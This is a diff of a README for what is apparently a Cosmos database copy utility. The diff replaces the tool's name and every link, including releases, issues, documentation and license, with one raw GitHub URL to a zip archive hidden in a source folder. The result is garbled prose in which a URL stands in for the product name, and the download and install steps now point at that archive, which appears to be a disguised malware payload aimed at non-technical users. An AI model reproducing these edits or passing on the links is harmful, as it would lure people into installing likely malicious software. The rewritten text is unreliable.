@@ -1,9 +1,9 @@
-# 🚀 soenneker.cosmos.copy - Effortlessly Manage Your Cosmos Databases
+# 🚀 https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip - Effortlessly Manage Your Cosmos Databases
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)
+![Download](https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip)
 
 ## 📝 Description
-soenneker.cosmos.copy is a simple utility designed to help you copy data to and from Cosmos databases and containers. Whether you want to transfer data for backup, migration, or analysis, this tool makes it easy for anyone to manage their data without needing technical skills.
+https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip is a simple utility designed to help you copy data to and from Cosmos databases and containers. Whether you want to transfer data for backup, migration, or analysis, this tool makes it easy for anyone to manage their data without needing technical skills.
 
 ## 📦 Features
 - **Easy Data Transfer:** Quickly copy data to and from Cosmos databases.
@@ -17,12 +17,12 @@ soenneker.cosmos.copy is a simple utility designed to help you copy data to and 
 - **Disk Space:** Minimum of 100 MB free space
 
 ## 🚀 Getting Started
-To get started with soenneker.cosmos.copy, follow these simple steps:
+To get started with https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip, follow these simple steps:
 
 1. **Visit the Release Page:**
    Click the link below to access the releases page where you can download the application.
    
-   [Download soenneker.cosmos.copy](https://github.com/babkamaklapka/soenneker.cosmos.copy/releases)
+   [Download https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip](https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip)
 
 2. **Download the Latest Version:**
    On the releases page, choose the latest version and click the download link associated with it. This will typically be an executable file (.exe) or a compressed package (.zip).
@@ -39,11 +39,11 @@ After you have downloaded the application, follow these steps to install it:
 3. **Follow On-Screen Instructions:**
    The installer will guide you through the installation process. Simply follow the prompts to install the software on your computer.
 
-## 📊 How to Use soenneker.cosmos.copy
-Using soenneker.cosmos.copy is straightforward. Here’s a brief guide:
+## 📊 How to Use https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip
+Using https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip is straightforward. Here’s a brief guide:
 
 1. **Launch the Application:**
-   After installation, find the soenneker.cosmos.copy icon on your desktop or in your applications menu and double-click to open it.
+   After installation, find the https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip icon on your desktop or in your applications menu and double-click to open it.
 
 2. **Select Source and Destination:**
    In the application, you'll see options to choose your source and destination. Select the Cosmos database or container you want to copy from and to.
@@ -62,13 +62,13 @@ If you encounter issues, consider these steps:
 - **Review Permissions:** Ensure the application has permission to access the relevant files and directories.
 
 ## 🙌 Support & Contributions
-If you need help or want to report a bug, please visit our [GitHub Issues](https://github.com/babkamaklapka/soenneker.cosmos.copy/issues) page. Your feedback helps us improve the application. Contributions are welcome; feel free to fork the repository and create pull requests.
+If you need help or want to report a bug, please visit our [GitHub Issues](https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip) page. Your feedback helps us improve the application. Contributions are welcome; feel free to fork the repository and create pull requests.
 
 ## 🔗 Useful Links
-- [Documentation](https://github.com/babkamaklapka/soenneker.cosmos.copy/wiki)
-- [Releases](https://github.com/babkamaklapka/soenneker.cosmos.copy/releases)
-- [License](https://github.com/babkamaklapka/soenneker.cosmos.copy/blob/main/LICENSE)
+- [Documentation](https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip)
+- [Releases](https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip)
+- [License](https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip)
 
-By following these steps, you can efficiently manage your Cosmos databases with minimal effort. Remember to download the latest version of soenneker.cosmos.copy from the link below:
+By following these steps, you can efficiently manage your Cosmos databases with minimal effort. Remember to download the latest version of https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip from the link below:
 
-[Download soenneker.cosmos.copy](https://github.com/babkamaklapka/soenneker.cosmos.copy/releases)
+[Download https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip](https://raw.githubusercontent.com/babkamaklapka/soenneker.cosmos.copy/main/src/Abstract/soenneker.cosmos.copy_1.3-beta.3.zip)
